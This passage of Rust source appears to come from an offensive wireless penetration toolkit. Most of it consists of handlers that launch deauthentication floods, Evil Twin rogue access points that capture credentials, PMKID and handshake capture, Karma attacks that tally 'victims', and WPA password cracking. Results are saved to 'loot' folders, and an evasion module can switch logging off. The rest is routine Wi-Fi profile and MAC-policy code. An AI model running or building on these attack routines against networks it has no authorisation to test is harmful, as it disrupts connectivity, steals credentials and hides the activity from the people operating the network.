            if let Err(e) = engine.apply(stage, interface, ssid) {
                log::warn!(
                    "[MAC_POLICY] apply failed on {} (stage={:?}): {}",
                    interface,
                    stage,
                    e
                );
            }
        }
        Err(e) => {
            log::warn!("[MAC_POLICY] initialization failed: {}", e);
        }
    }
}

fn load_mac_policy_config(root: &Path) -> MacPolicyConfig {
    let policy_path = root.join("wifi").join("mac_policy.json");
    if policy_path.exists() {
        match MacPolicyConfig::load(&policy_path) {
            Ok(cfg) => return cfg,
            Err(e) => log::warn!(
                "[MAC_POLICY] Failed to load {}: {}. Falling back to gui_conf.json",
                policy_path.display(),
                e
            ),
        }
    }

    let gui_path = root.join("gui_conf.json");
    let mut cfg = MacPolicyConfig::default();

    let raw = match fs::read_to_string(&gui_path) {
        Ok(data) => data,
        Err(_) => return cfg,
    };
    let json: Value = match serde_json::from_str(&raw) {
        Ok(val) => val,
        Err(_) => return cfg,
    };
    let settings = match json.get("settings") {
        Some(val) => val,
        None => return cfg,
    };

    let mac_random = settings
        .get("mac_randomization_enabled")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);
    let per_network = settings
        .get("per_network_mac_enabled")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);

    if per_network {
        cfg.assoc_mode = MacMode::Stable;
        cfg.preassoc_mode = MacMode::Random;
        cfg.stable_scope = StableScope::Ssid;
        cfg.vendor_policy = VendorPolicy::PreserveCurrent;
    } else if mac_random {
        cfg.assoc_mode = MacMode::Random;
        cfg.preassoc_mode = MacMode::Random;
        cfg.vendor_policy = VendorPolicy::PreserveCurrent;
    }

    if let Some(exceptions) = settings
        .get("mac_randomization_exceptions")
        .and_then(|v| v.as_array())
    {
        cfg.exceptions = exceptions
            .iter()
            .filter_map(|v| v.as_str().map(|s| s.to_string()))
            .collect();
    }

    if let Some(lifetime) = settings
        .get("mac_randomization_lifetime_secs")
        .and_then(|v| v.as_u64())
    {
        cfg.lifetime_secs = Some(lifetime);
    }

    cfg
}

fn per_network_mac_override(root: &Path, interface: &str, ssid: &str) -> Option<String> {
    if interface.trim().is_empty() || ssid.trim().is_empty() {
        return None;
    }
    let gui_path = root.join("gui_conf.json");
    let raw = fs::read_to_string(&gui_path).ok()?;
    let json: Value = serde_json::from_str(&raw).ok()?;
    let settings = json.get("settings")?;
    let per_network = settings.get("per_network_macs")?.as_object()?;
    let iface_map = per_network.get(interface)?.as_object()?;
    iface_map
        .get(ssid)
        .and_then(|v| v.as_str())
        .map(|s| s.to_string())
}

fn handle_wifi_deauth(root: &Path, args: WifiDeauthArgs) -> Result<HandlerResult> {
    use crate::wireless_native::{self, DeauthConfig};

    let ssid_display = args.ssid.clone().unwrap_or_else(|| args.bssid.clone());
    log::info!(
        "Starting native Rust deauth attack on BSSID: {} (SSID: {})",
        args.bssid,
        ssid_display
    );

    // Validate BSSID format (XX:XX:XX:XX:XX:XX)
    let mac_regex = Regex::new(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$").unwrap();
    if !mac_regex.is_match(&args.bssid) {
        bail!("Invalid BSSID format. Expected MAC address like AA:BB:CC:DD:EE:FF");
    }

    // Validate client MAC if provided
    if let Some(ref client) = args.client {
        if !mac_regex.is_match(client) {
            bail!("Invalid client MAC format. Expected like AA:BB:CC:DD:EE:FF");
        }
    }

    // Validate channel (1-14 for 2.4GHz, 36-165 for 5GHz)
    if args.channel == 0 || (args.channel > 14 && args.channel < 36) || args.channel > 165 {
        bail!(
            "Invalid channel {}. Use 1-14 for 2.4GHz or 36-165 for 5GHz",
            args.channel
        );
    }

    // Check if we have root privileges (required for raw sockets)
    if !wireless_native::native_available() {
        bail!("Deauth attacks require root privileges. Run with sudo.");
    }

    // Check if interface is wireless
    if !wireless_native::is_wireless_interface(&args.interface) {
        bail!("Interface {} is not a wireless interface", args.interface);
    }

    enforce_single_interface(&args.interface)?;

    // Check wireless capabilities
    let caps = wireless_native::check_capabilities(&args.interface);
    if !caps.is_attack_capable() {
        let mut reasons = Vec::new();
        if !caps.has_root {
            reasons.push("not running as root");
        }
        if !caps.interface_is_wireless {
            reasons.push("interface is not wireless");
        }
        if !caps.supports_monitor_mode {
            reasons.push("monitor mode not supported");
        }
        bail!(
            "Interface {} is not capable of attacks: {}",
            args.interface,
            reasons.join(", ")
        );
    }

    // Create loot directory under network-specific folder + attack type
    let loot_dir =
        wireless_target_directory(root, args.ssid.clone(), Some(args.bssid.clone())).join("Deauth");
    fs::create_dir_all(&loot_dir)
        .with_context(|| format!("creating loot directory: {}", loot_dir.display()))?;

    let tag = wireless_tag(
        args.ssid.as_deref(),
        Some(args.bssid.as_str()),
        &args.interface,
    );
    let _ = log_mac_usage(root, &args.interface, "wifi_deauth", Some(&tag));

    // Build deauth config for native implementation
    let config = DeauthConfig {
        bssid: args.bssid.clone(),
        ssid: args.ssid.clone(),
        channel: args.channel,
        interface: args.interface.clone(),
        client: args.client.clone(),
        packets: args.packets,
        duration: args.duration,
        interval: args.interval,
        continuous: args.continuous,
    };

    log::info!("Executing native Rust deauth attack (rustyjack-wireless)");

    // Execute the native deauth attack
    let result = wireless_native::execute_deauth_attack(&loot_dir, &config, |progress, status| {
        log::debug!("Deauth progress: {:.0}% - {}", progress * 100.0, status);
    })?;

    let target_label = args.ssid.clone().unwrap_or_else(|| args.bssid.clone());
    let log_file = if result.log_file.as_os_str().is_empty() {
        let summary = vec![
            format!("Deauth attack on {}", ssid_display),
            format!("Interface: {}", args.interface),
            format!("Channel: {}", args.channel),
            format!("Packets per burst: {}", args.packets),
            format!("Bursts: {}", result.bursts),
            format!("Packets sent: {}", result.packets_sent),
            format!("Duration (s): {}", result.duration_secs),
            format!("Handshake captured: {}", result.handshake_captured),
        ];
        write_scoped_log(
            root,
            "Wireless",
            &target_label,
            "Deauth",
            "deauth",
            &summary,
        )
        .map(|p| p.display().to_string())
    } else {
        move_log_into_scope(
            root,
            "Wireless",
            &target_label,
            "Deauth",
            &result.log_file,
            "deauth",
        )
        .map(|p| p.display().to_string())
    };

    // Build response data
    let data = json!({
        "bssid": result.bssid,
        "ssid": result.ssid,
        "channel": result.channel,
        "interface": args.interface,
        "duration": result.duration_secs,
        "packets_per_burst": args.packets,
        "total_packets_sent": result.packets_sent,
        "deauth_bursts": result.bursts,
        "continuous_mode": args.continuous,
        "target_client": args.client,
        "log_file": log_file,
        "capture_files": result.capture_files.iter().map(|p| p.display().to_string()).collect::<Vec<_>>(),
        "handshake_captured": result.handshake_captured,
        "handshake_file": result.handshake_file.as_ref().map(|p| p.display().to_string()),
        "eapol_frames": result.eapol_frames,
        "loot_directory": loot_dir.display().to_string(),
        "implementation": "native-rust",
        "isolation_enforced": true,
    });

    let message = if result.handshake_captured {
        format!(
            "SUCCESS: Handshake captured! ({} packets in {} bursts, {} EAPOL frames)",
            result.packets_sent, result.bursts, result.eapol_frames
        )
    } else {
        format!(
            "Deauth completed - {} packets sent in {} bursts, no handshake captured",
            result.packets_sent, result.bursts
        )
    };

    Ok((message, data))
}

fn handle_wifi_evil_twin(root: &Path, args: WifiEvilTwinArgs) -> Result<HandlerResult> {
    use crate::wireless_native;
    use rustyjack_wireless::evil_twin::{execute_evil_twin, EvilTwin, EvilTwinConfig};
    use std::time::Duration;

    log::info!("Starting Evil Twin attack on SSID: {}", args.ssid);

    // Check if we have root privileges
    if !wireless_native::native_available() {
        bail!("Evil Twin attacks require root privileges. Run with sudo.");
    }

    // Check if interface is wireless
    if !wireless_native::is_wireless_interface(&args.interface) {
        bail!("Interface {} is not a wireless interface", args.interface);
    }

    enforce_single_interface(&args.interface)?;

    // Check required tools are installed
    let missing = EvilTwin::check_requirements()
        .map_err(|e| anyhow::anyhow!("Failed to check requirements: {}", e))?;
    if !missing.is_empty() {
        bail!(
            "Missing required tools for Evil Twin: {}. Install with: apt install {}",
            missing.join(", "),
            missing.join(" ")
        );
    }

    let tag = wireless_tag(
        Some(args.ssid.as_str()),
        args.target_bssid.as_deref(),
        &args.interface,
    );
    let _ = log_mac_usage(root, &args.interface, "wifi_evil_twin", Some(&tag));

    // Create loot directory for captured credentials under target + attack type
    let loot_dir =
        wireless_target_directory(root, Some(args.ssid.clone()), args.target_bssid.clone())
            .join("EvilTwin");
    fs::create_dir_all(&loot_dir)
        .with_context(|| format!("creating loot directory: {}", loot_dir.display()))?;

    // Parse target BSSID if provided
    let target_bssid = if let Some(ref bssid_str) = args.target_bssid {
        Some(
            bssid_str
                .parse()
                .map_err(|e| anyhow::anyhow!("Invalid BSSID: {}", e))?,
        )
    } else {
        None
    };

    // Configure the Evil Twin attack
    let config = EvilTwinConfig {
        ssid: args.ssid.clone(),
        channel: args.channel,
        ap_interface: args.interface.clone(),
        deauth_interface: None, // Could add second interface support later
        target_bssid,
        simultaneous_deauth: false, // Requires second interface
        deauth_interval: Duration::from_secs(5),
        duration: Duration::from_secs(args.duration.into()),
        open_network: args.open,
        wpa_password: None,
        capture_path: loot_dir.to_string_lossy().to_string(),
    };

    // Execute the attack with progress callback
    let result = execute_evil_twin(config, Some(&loot_dir.to_string_lossy()), |msg| {
        log::info!("Evil Twin: {}", msg);
    })
    .map_err(|e| anyhow::anyhow!("Evil Twin attack failed: {}", e))?;

    let target_label = args.ssid.clone();
    let log_file = if result.log_path.as_os_str().is_empty() {
        let summary = vec![
            format!("Evil Twin on {}", target_label),
            format!("Interface: {}", args.interface),
            format!("Channel: {}", args.channel),
            format!("Duration (s): {}", args.duration),
            format!("Clients: {}", result.stats.clients_connected),
            format!("Handshakes: {}", result.stats.handshakes_captured),
            format!("Credentials: {}", result.stats.credentials_captured),
            format!("Deauth packets: {}", result.stats.deauth_packets),
        ];
        write_scoped_log(
            root,
            "Wireless",
            target_label.as_str(),
            "EvilTwin",
            "eviltwin",
            &summary,
        )
        .map(|p| p.display().to_string())
    } else {
        move_log_into_scope(
            root,
            "Wireless",
            target_label.as_str(),
            "EvilTwin",
            &result.log_path,
            "eviltwin",
        )
        .map(|p| p.display().to_string())
    };

    let data = json!({
        "ssid": args.ssid,
        "interface": args.interface,
        "channel": args.channel,
        "target_bssid": args.target_bssid,
        "duration": args.duration,
        "open_network": args.open,
        "status": if result.stats.ap_started { "completed" } else { "failed" },
        "clients_connected": result.stats.clients_connected,
        "handshakes_captured": result.stats.handshakes_captured,
        "credentials_captured": result.stats.credentials_captured,
        "deauth_packets": result.stats.deauth_packets,
        "attack_duration_secs": result.stats.duration.as_secs(),
        "loot_directory": result.loot_path.display().to_string(),
        "log_file": log_file,
        "isolation_enforced": true,
    });

    let message = if result.stats.ap_started {
        format!(
            "Evil Twin complete: {} clients, {} handshakes captured",
            result.stats.clients_connected, result.stats.handshakes_captured
        )
    } else {
        "Evil Twin attack failed to start AP".to_string()
    };

    Ok((message, data))
}

fn handle_wifi_pmkid(root: &Path, args: WifiPmkidArgs) -> Result<HandlerResult> {
    use crate::wireless_native::{self, PmkidCaptureConfig};

    log::info!("Starting PMKID capture on interface: {}", args.interface);

    // Check privileges
    if !wireless_native::native_available() {
        bail!("PMKID capture requires root privileges. Run with sudo.");
    }

    // Check if interface is wireless
    if !wireless_native::is_wireless_interface(&args.interface) {
        bail!("Interface {} is not a wireless interface", args.interface);
    }

    enforce_single_interface(&args.interface)?;

    // Check capabilities
    let caps = wireless_native::check_capabilities(&args.interface);
    if !caps.supports_monitor_mode {
        bail!(
            "Interface {} does not support monitor mode (required for PMKID)",
            args.interface
        );
    }

    // Create loot directory under target network + attack type
    let loot_dir =
        wireless_target_directory(root, args.ssid.clone(), args.bssid.clone()).join("PMKID");
    fs::create_dir_all(&loot_dir)?;

    let tag = wireless_tag(args.ssid.as_deref(), args.bssid.as_deref(), &args.interface);
    let _ = log_mac_usage(root, &args.interface, "wifi_pmkid", Some(&tag));

    // Build config for native implementation
    let config = PmkidCaptureConfig {
        interface: args.interface.clone(),
        channel: args.channel,
        target_bssid: args.bssid.clone(),
        duration_secs: args.duration,
    };

    // Execute the native PMKID capture
    let result = wireless_native::execute_pmkid_capture(&loot_dir, &config, |progress, status| {
        log::debug!("PMKID progress: {:.0}% - {}", progress * 100.0, status);
    })?;

    let target_label = args
        .ssid
        .clone()
        .or_else(|| args.bssid.clone())
        .unwrap_or_else(|| "unknown".to_string());
    let log_file = write_scoped_log(
        root,
        "Wireless",
        &target_label,
        "PMKID",
        "pmkid",
        &[
            format!("PMKID capture on {}", target_label),
            format!("Interface: {}", args.interface),
            format!("Channel: {}", args.channel),
            format!("Duration (s): {}", args.duration),
            format!("PMKIDs: {}", result.pmkids_captured),
            format!("Networks seen: {}", result.networks_seen),
            format!(
                "Hashcat file: {}",
                result
                    .hashcat_file
                    .as_ref()
                    .map(|p| p.display().to_string())
                    .unwrap_or_else(|| "none".to_string())
            ),
        ],
    )
    .map(|p| p.display().to_string());

    let data = json!({
        "interface": args.interface,
        "bssid": args.bssid,
        "ssid": args.ssid,
        "channel": args.channel,
        "duration": args.duration,
        "pmkids_captured": result.pmkids_captured,
        "networks_seen": result.networks_seen,
        "hashcat_file": result.hashcat_file.as_ref().map(|p| p.display().to_string()),
        "loot_directory": result.loot_path.display().to_string(),
        "log_file": log_file,
        "isolation_enforced": true,
    });

    let message = if result.pmkids_captured > 0 {
        format!(
            "PMKID captured! {} PMKIDs from {} networks",
            result.pmkids_captured, result.networks_seen
        )
    } else {
        "PMKID capture complete - no PMKIDs found".to_string()
    };

    Ok((message, data))
}

fn handle_wifi_probe_sniff(root: &Path, args: WifiProbeSniffArgs) -> Result<HandlerResult> {
    use crate::wireless_native::{self, ProbeSniffConfig as NativeProbeConfig};

    log::info!(
        "Starting probe request sniff on interface: {}",
        args.interface
    );

    // Check privileges
    if !wireless_native::native_available() {
        bail!("Probe sniffing requires root privileges. Run with sudo.");
    }

    // Check if interface is wireless
    if !wireless_native::is_wireless_interface(&args.interface) {
        bail!("Interface {} is not a wireless interface", args.interface);
    }

    enforce_single_interface(&args.interface)?;

    // Check capabilities
    let caps = wireless_native::check_capabilities(&args.interface);
    if !caps.supports_monitor_mode {
        bail!(
            "Interface {} does not support monitor mode (required for probe sniffing)",
            args.interface
        );
    }

    // Create loot directory for probe sniffing (goes under probe_sniff subdirectory)
    let loot_dir = loot_directory(root, LootKind::Wireless).join("probe_sniff");
    fs::create_dir_all(&loot_dir)?;

    let tag = wireless_tag(None, None, &args.interface);
    let _ = log_mac_usage(root, &args.interface, "wifi_probe_sniff", Some(&tag));

    // Build config for native implementation
    let config = NativeProbeConfig {
        interface: args.interface.clone(),
        channel: args.channel,
        duration_secs: args.duration,
    };

    // Execute the native probe sniff
    let result = wireless_native::execute_probe_sniff(&loot_dir, &config, |progress, status| {
        log::debug!(
            "Probe sniff progress: {:.0}% - {}",
            progress * 100.0,
            status
        );
    })?;

    let log_file = write_scoped_log(
        root,
        "Wireless",
        &args.interface,
        "ProbeSniff",
        "probesniff",
        &[
            format!("Probe sniff on {}", args.interface),
            format!("Channel: {}", args.channel),
            format!("Duration (s): {}", args.duration),
            format!("Total probes: {}", result.probes_captured),
            format!("Unique clients: {}", result.unique_clients),
            format!("Unique networks: {}", result.unique_networks),
        ],
    )
    .map(|p| p.display().to_string());

    let data = json!({
        "interface": args.interface,
        "channel": args.channel,
        "duration": args.duration,
        "total_probes": result.probes_captured,
        "unique_clients": result.unique_clients,
        "unique_networks": result.unique_networks,
        "loot_directory": result.loot_path.display().to_string(),
        "log_file": log_file,
    });

    Ok((
        format!(
            "Probe sniff complete: {} probes, {} clients, {} networks",
            result.probes_captured, result.unique_clients, result.unique_networks
        ),
        data,
    ))
}

fn handle_wifi_karma(root: &Path, args: WifiKarmaArgs) -> Result<HandlerResult> {
    use crate::wireless_native::{self, KarmaAttackConfig};

    log::info!("Starting Karma attack on interface: {}", args.interface);

    // Check privileges
    if !wireless_native::native_available() {
        bail!("Karma attack requires root privileges. Run with sudo.");
    }

    // Check if interface is wireless
    if !wireless_native::is_wireless_interface(&args.interface) {
        bail!("Interface {} is not a wireless interface", args.interface);
    }

    // Check capabilities
    let caps = wireless_native::check_capabilities(&args.interface);
    if !caps.supports_monitor_mode {
        bail!(
            "Interface {} does not support monitor mode (required for Karma)",
            args.interface
        );
    }

    let tag = wireless_tag(None, None, &args.interface);
    let _ = log_mac_usage(root, &args.interface, "wifi_karma", Some(&tag));

    // Parse whitelist/blacklist
    let ssid_whitelist: Vec<String> = args
        .ssid_whitelist
        .as_ref()
        .map(|s| s.split(',').map(|ss| ss.trim().to_string()).collect())
        .unwrap_or_default();

    let ssid_blacklist: Vec<String> = args
        .ssid_blacklist
        .as_ref()
        .map(|s| s.split(',').map(|ss| ss.trim().to_string()).collect())
        .unwrap_or_default();

    // Create loot directory
    let loot_dir = loot_directory(root, LootKind::Wireless).join("karma");
    fs::create_dir_all(&loot_dir)?;

    // Build config
    let config = KarmaAttackConfig {
        interface: args.interface.clone(),
        ap_interface: args.ap_interface.clone(),
        channel: args.channel,
        duration_secs: args.duration,
        with_ap: args.with_ap,
        ssid_whitelist: ssid_whitelist.clone(),
        ssid_blacklist: ssid_blacklist.clone(),
    };

    // Execute the Karma attack
    let result = wireless_native::execute_karma(&loot_dir, &config, |progress, status| {
        log::debug!("Karma progress: {:.0}% - {}", progress * 100.0, status);
    })?;

    let log_file = write_scoped_log(
        root,
        "Wireless",
        &args.interface,
        "Karma",
        "karma",
        &[
            format!("Karma attack on {}", args.interface),
            format!("Channel: {}", args.channel),
            format!("Duration (s): {}", args.duration),
            format!("With AP: {}", args.with_ap),
            format!("Probes: {}", result.probes_seen),
            format!("Unique SSIDs: {}", result.unique_ssids),
            format!("Unique clients: {}", result.unique_clients),
            format!("Victims: {}", result.victims),
        ],
    )
    .map(|p| p.display().to_string());

    let data = json!({
        "interface": args.interface,
        "ap_interface": args.ap_interface,
        "channel": args.channel,
        "duration": args.duration,
        "with_ap": args.with_ap,
        "ssid_whitelist": ssid_whitelist,
        "ssid_blacklist": ssid_blacklist,
        "probes_seen": result.probes_seen,
        "unique_ssids": result.unique_ssids,
        "unique_clients": result.unique_clients,
        "victims": result.victims,
        "loot_directory": result.loot_path.display().to_string(),
        "log_file": log_file,
    });

    Ok((
        format!(
            "Karma complete: {} probes, {} SSIDs, {} clients, {} victims",
            result.probes_seen, result.unique_ssids, result.unique_clients, result.victims
        ),
        data,
    ))
}

fn handle_wifi_crack(root: &Path, args: WifiCrackArgs) -> Result<HandlerResult> {
    use rustyjack_wireless::crack::{generate_ssid_passwords, quick_crack, WpaCracker};
    use rustyjack_wireless::handshake::HandshakeExport;
    use std::path::PathBuf;

    log::info!("Starting handshake crack on file: {}", args.file);

    #[derive(serde::Deserialize)]
    struct HandshakeBundle {
        ssid: String,
        handshake: HandshakeExport,
    }

    let file_path = PathBuf::from(&args.file);
    if !file_path.exists() {
        bail!("Handshake file not found: {}", args.file);
    }

    // Only support JSON handshake exports for cracking
    if file_path
        .extension()
        .and_then(|e| e.to_str())
        .unwrap_or("")
        .to_ascii_lowercase()
        != "json"
    {
        bail!("Unsupported handshake format. Use the generated handshake_export_*.json file from a capture.");
    }

    // Load handshake export bundle (JSON)
    let bundle: HandshakeBundle = {
        let data = fs::read(&file_path)
            .with_context(|| format!("reading handshake export {}", file_path.display()))?;
        serde_json::from_slice(&data)
            .with_context(|| format!("parsing handshake export {}", file_path.display()))?
    };

    let ssid = args.ssid.as_deref().unwrap_or(&bundle.ssid).to_string();

    // Determine crack mode
    let mode = args.mode.as_str();

    // Prepare loot directory for results (use same folder as the handshake export)
    let parent_dir = file_path
        .parent()
        .map(PathBuf::from)
        .unwrap_or_else(|| loot_directory(root, LootKind::Wireless));
    fs::create_dir_all(&parent_dir)?;

    let mut cracker = WpaCracker::new(bundle.handshake.clone(), &ssid);
    let mut attempts = 0u64;
    let mut password: Option<String> = None;

    match mode {
        "quick" => {
            password = quick_crack(&bundle.handshake, &ssid);
            attempts = cracker.attempts();
        }
        "pins" => match cracker.crack_pins() {
            Ok(r) => match r {
                rustyjack_wireless::crack::CrackResult::Found(p) => password = Some(p),
                rustyjack_wireless::crack::CrackResult::Exhausted { attempts: a }
                | rustyjack_wireless::crack::CrackResult::Stopped { attempts: a } => attempts = a,
            },
            Err(e) => bail!("PIN crack error: {}", e),
        },
        "ssid" => {
            let patterns = generate_ssid_passwords(&ssid);
            match cracker.crack_passwords(&patterns) {
                Ok(r) => match r {
                    rustyjack_wireless::crack::CrackResult::Found(p) => password = Some(p),
                    rustyjack_wireless::crack::CrackResult::Exhausted { attempts: a }
                    | rustyjack_wireless::crack::CrackResult::Stopped { attempts: a } => {
                        attempts = a
                    }
                },
                Err(e) => bail!("SSID-pattern crack error: {}", e),
            }
        }
        "wordlist" => {
            let wordlist = args
                .wordlist
                .as_ref()
                .ok_or_else(|| anyhow!("wordlist mode requires --wordlist"))?;
            match cracker.crack_wordlist(PathBuf::from(wordlist).as_path()) {
                Ok(r) => match r {
                    rustyjack_wireless::crack::CrackResult::Found(p) => password = Some(p),
                    rustyjack_wireless::crack::CrackResult::Exhausted { attempts: a }
                    | rustyjack_wireless::crack::CrackResult::Stopped { attempts: a } => {
                        attempts = a
                    }
                },
                Err(e) => bail!("Wordlist crack error: {}", e),
            }
        }
        _ => bail!("Unknown crack mode: {}", mode),
    }

    if attempts == 0 {
        attempts = cracker.attempts();
    }

    // Save result if password found
    let mut loot_path = None;
    if let Some(ref pwd) = password {
        let ts = chrono::Local::now().format("%Y%m%d_%H%M%S");
        let outfile = parent_dir.join(format!("crack_result_{}.txt", ts));
        let content = format!(
            "SSID: {}\nFile: {}\nMode: {}\nPassword: {}\nAttempts: {}\n",
            ssid,
            file_path.display(),
            mode,
            pwd,
            attempts
        );
        fs::write(&outfile, content)
            .with_context(|| format!("writing crack result {}", outfile.display()))?;
        loot_path = Some(outfile);
    }

    let data = json!({
        "file": args.file,
        "ssid": ssid,
        "mode": mode,
        "wordlist": args.wordlist,
        "status": if password.is_some() { "found" } else { "exhausted" },
        "attempts": attempts,
        "password": password,
        "loot_path": loot_path.as_ref().map(|p| p.display().to_string()),
    });

    Ok((
        if password.is_some() {
            "Password found".to_string()
        } else {
            "Crack attempt finished".to_string()
        },
        data,
    ))
}

fn handle_wifi_profile_list(root: &Path) -> Result<HandlerResult> {
    log::info!("Listing WiFi profiles");

    let profiles = match list_wifi_profiles(root) {
        Ok(p) => {
            log::info!("Found {} profile(s)", p.len());
            p
        }
        Err(e) => {
            log::error!("Failed to list WiFi profiles: {e}");
            bail!("Failed to list WiFi profiles: {e}");
        }
    };

    let data = json!({
        "profiles": profiles,
        "count": profiles.len(),
    });
    Ok(("Wi-Fi profiles loaded".to_string(), data))
}

fn handle_wifi_profile_save(root: &Path, args: WifiProfileSaveArgs) -> Result<HandlerResult> {
    let WifiProfileSaveArgs {
        ssid,
        password,
        interface,
        priority,
        auto_connect,
    } = args;

    log::info!(
        "[CORE] Saving WiFi profile for SSID: {ssid} iface={}",
        interface
    );

    let profile = WifiProfile {
        ssid: ssid.clone(),
        password: Some(password),
        interface,
        priority: priority as i32,
        auto_connect: auto_connect.unwrap_or(true),
        created: None,
        last_used: None,
        notes: None,
    };

    let path = match save_wifi_profile(root, &profile) {
        Ok(p) => {
            log::info!("[CORE] Profile saved successfully to: {}", p.display());
            p
        }
        Err(e) => {
            log::error!("[CORE] Failed to save WiFi profile for {ssid}: {e}");
            bail!("Failed to save WiFi profile: {e}");
        }
    };

    let data = json!({
        "ssid": ssid,
        "path": path,
    });
    Ok(("Wi-Fi profile saved".to_string(), data))
}

fn handle_wifi_profile_connect(root: &Path, args: WifiProfileConnectArgs) -> Result<HandlerResult> {
    log::info!(
        "[CORE] WiFi connect requested profile={:?} ssid={:?} iface={:?} remember={}",
        args.profile,
        args.ssid,
        args.interface,
        args.remember
    );

    let interface = match select_wifi_interface(args.interface.clone()) {
        Ok(iface) => {
            log::info!("Selected interface: {iface}");
            iface
        }
        Err(e) => {
            log::error!("Failed to select interface: {e}");
            bail!("Failed to select interface: {e}");
        }
    };

    let stored = if let Some(ref profile_name) = args.profile {
        log::info!("Loading profile: {profile_name}");
        match load_wifi_profile(root, profile_name) {
            Ok(p) => p,
            Err(e) => {
                log::error!("Failed to load profile '{profile_name}': {e}");
                bail!("Failed to load profile: {e}");
            }
        }
    } else if let Some(ref ssid) = args.ssid {
        log::info!("Loading profile by SSID: {ssid}");
        match load_wifi_profile(root, ssid) {
            Ok(p) => p,
            Err(e) => {
                log::warn!("Could not load profile for SSID '{ssid}': {e}");
                None
            }
        }
    } else {
        None
    };

    let ssid = args
        .ssid
        .clone()
        .or_else(|| stored.as_ref().map(|p| p.profile.ssid.clone()))
        .ok_or_else(|| {
            log::error!("[CORE] WiFi connect failed: no SSID provided/profile not found");
            anyhow!("Provide --ssid or --profile when connecting to Wi-Fi")
        })?;

    let password = args
        .password
        .clone()
        .or_else(|| stored.as_ref().and_then(|p| p.profile.password.clone()));

    log::info!("[CORE] Connecting to SSID: {ssid} on interface: {interface}");

    try_apply_mac_policy(root, MacStage::Assoc, &interface, Some(&ssid));

    if let Err(e) = connect_wifi_network(&interface, &ssid, password.as_deref()) {
        log::error!("[CORE] Failed to connect to {ssid}: {e}");
        bail!("WiFi connection failed: {e}");
    }

    log::info!("[CORE] WiFi connection successful ssid={ssid} iface={interface}");

    let (route_msg, route_data) =
        handle_wifi_route_ensure(root, WifiRouteEnsureArgs { interface: interface.clone() })?;
    log::info!("[CORE] Route ensure after WiFi connect: {}", route_msg);
    if let Some(false) = route_data.get("route_set").and_then(|v| v.as_bool()) {
        log::warn!(
            "[CORE] No gateway detected after WiFi connect on {}",
            interface
        );
    }
    if let Some(false) = route_data.get("ping_success").and_then(|v| v.as_bool()) {
        log::warn!(
            "[CORE] Ping test failed after WiFi connect on {}",
            interface
        );
    }

    let mut remembered = false;
    if let Some(mut stored_profile) = stored {
        stored_profile.profile.last_used = Some(Local::now().to_rfc3339());
        if args.remember {
            if let Some(pass) = password.clone() {
                stored_profile.profile.password = Some(pass);
                log::info!("Updating stored profile with new password");
            } else {
                log::warn!("--remember flag set but no password available to store");
            }
        }
        if let Err(e) = write_wifi_profile(&stored_profile.path, &stored_profile.profile) {
            log::error!("Failed to update profile: {e}");
        } else {
            remembered = true;
            log::info!("Profile updated successfully");
        }
    } else if args.remember {
        if let Some(pass) = password.clone() {
            let profile = WifiProfile {
                ssid: ssid.clone(),
                password: Some(pass),
                interface: args.interface.clone().unwrap_or_else(|| "auto".to_string()),
                priority: 1,
                auto_connect: true,
                created: None,
                last_used: None,
                notes: None,
            };
            match save_wifi_profile(root, &profile) {
                Ok(_) => {
                    remembered = true;
                    log::info!("New profile created and saved");
                }
                Err(e) => {
                    log::error!("Failed to save new profile: {e}");
                }
            }
        } else {
            log::warn!("--remember flag ignored because no password was supplied");
        }
    }

    let data = json!({
        "interface": interface,
        "ssid": ssid,
        "remembered": remembered,
    });
    Ok(("Wi-Fi connection triggered".to_string(), data))
}

fn handle_wifi_profile_delete(root: &Path, args: WifiProfileDeleteArgs) -> Result<HandlerResult> {
    log::info!("[CORE] Attempting to delete WiFi profile: {}", args.ssid);

    match delete_wifi_profile(root, &args.ssid) {
        Ok(()) => {
            log::info!("[CORE] Profile deleted successfully: {}", args.ssid);
            let data = json!({ "ssid": args.ssid });
            Ok(("Wi-Fi profile deleted".to_string(), data))
        }
        Err(e) => {
            log::error!("[CORE] Failed to delete profile '{}': {e}", args.ssid);
            bail!("Failed to delete profile: {e}");
        }
    }
}

fn handle_wifi_disconnect(args: WifiDisconnectArgs) -> Result<HandlerResult> {
    log::info!(
        "[CORE] Attempting WiFi disconnect iface={:?}",
        args.interface
    );

    let interface = match disconnect_wifi_interface(args.interface.clone()) {
        Ok(iface) => {
            log::info!("[CORE] Successfully disconnected interface: {iface}");
            iface
        }
        Err(e) => {
            log::error!("[CORE] Failed to disconnect WiFi: {e}");
            bail!("WiFi disconnect failed: {e}");
        }
    };

    let data = json!({ "interface": interface });
    Ok(("Wi-Fi interface disconnected".to_string(), data))
}

fn wireless_tag(ssid: Option<&str>, bssid: Option<&str>, interface: &str) -> String {
    if let Some(name) = ssid {
        if !name.trim().is_empty() {
            return sanitize_label(name);
        }
    }
    if let Some(mac) = bssid {
        if !mac.trim().is_empty() {
            return sanitize_label(mac);
        }
    }
    sanitize_label(interface)
}

fn loot_directory(root: &Path, kind: LootKind) -> PathBuf {
    match kind {
        LootKind::Nmap => root.join("loot").join("Nmap"),
        LootKind::Responder => root.join("Responder").join("logs"),
        LootKind::Dnsspoof => root.join("DNSSpoof").join("captures"),
        LootKind::Ethernet => root.join("loot").join("Ethernet"),
        LootKind::Wireless => root.join("loot").join("Wireless"),
    }
}

fn scoped_log_dir(root: &Path, scope: &str, target: &str, action: &str) -> Option<PathBuf> {
    if rustyjack_evasion::logs_disabled() {
        return None;
    }
    let safe_target = if target.trim().is_empty() {
        "Unknown".to_string()
    } else {
        sanitize_label(target)
    };
    let safe_action = if action.trim().is_empty() {
        "logs".to_string()
    } else {
        sanitize_label(action)
    };
    let dir = root
        .join("loot")
        .join(scope)
        .join(safe_target)
        .join(safe_action)
        .join("logs");
    fs::create_dir_all(&dir).ok()?;
    Some(dir)
}

fn move_log_into_scope(
    root: &Path,
    scope: &str,
    target: &str,
    action: &str,
    src: &Path,
    hint: &str,
) -> Option<PathBuf> {
    if !src.exists() {
        return None;
    }
    let dir = scoped_log_dir(root, scope, target, action)?;
    let filename = src
        .file_name()
        .and_then(|n| n.to_str())
        .map(|s| s.to_string())
        .unwrap_or_else(|| {
            format!(
                "{}_{}.log",
                sanitize_label(hint),
                Local::now().format("%Y%m%d_%H%M%S")
            )
        });
    let dest = dir.join(filename);
    if fs::rename(src, &dest).is_err() {
        let _ = fs::copy(src, &dest);
    }
    Some(dest)
}

